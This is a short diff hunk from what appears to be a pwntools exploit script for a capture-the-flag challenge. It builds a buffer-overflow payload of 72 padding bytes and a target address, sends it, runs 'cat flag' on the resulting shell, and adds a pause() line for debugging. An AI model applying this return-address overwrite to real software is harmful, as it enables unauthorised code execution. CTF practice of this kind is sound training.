@@ -24,6 +24,7 @@ target = 0x4006b6
 payload += cyclic(72)
 payload += p64(target)
 
+pause()
 p.sendlineafter("ARE YOU READY FOR THE CSGAMES ?!?!", payload)
 
 p.sendline("cat flag")
